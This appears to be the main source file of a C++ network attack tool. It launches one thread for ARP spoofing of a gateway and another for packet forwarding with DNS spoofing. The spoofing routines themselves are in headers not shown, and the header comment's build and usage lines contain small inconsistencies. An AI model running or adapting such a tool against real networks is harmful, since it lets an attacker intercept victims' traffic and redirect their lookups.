/*
 *                           DNS SPOOFER
 * Compilation:  gcc -Wall ./dnspoof.c -o dnspoof -lnet -lpthread
 * Usage:        ./dnspoog INTERFACE DEFAULT_GATEWAY_IP DEFAULT_GATEWAY_MAC
 * NOTE:         This program requires root privileges.
 *
 */

#include <thread>
#include <csignal>
#include <iostream>

#include "helper.h"
#include "arp_spoofer/arp_spoofer.h"
#include "forwarder_and_dns_spoofer/forwarder_and_dns_spoofer.h"

int main(int argc, char **argv) {
    if (argc < 4) {
        std::cerr << "Bad arguments count! Arguments are: INTERFACE DEFAULT_GATEWAY_IP DEFAULT_GATEWAY_MAC\n";
        exit(EXIT_FAILURE);
    }

    static char *interface_name = argv[1];
    static char *default_gateway_ip = argv[2];
    static char *default_gateway_mac = argv[3];

    if (readConfigFile() == -1)
        exit(EXIT_FAILURE);

    std::signal(SIGINT, stop);

    std::thread arp_spoofer(arp_spoof, interface_name, default_gateway_ip);
    std::thread forwarder_and_dns_spoofer(forward_and_dns_spoof, interface_name, default_gateway_mac);

    arp_spoofer.join();
    forwarder_and_dns_spoofer.join();

    return 0;
}
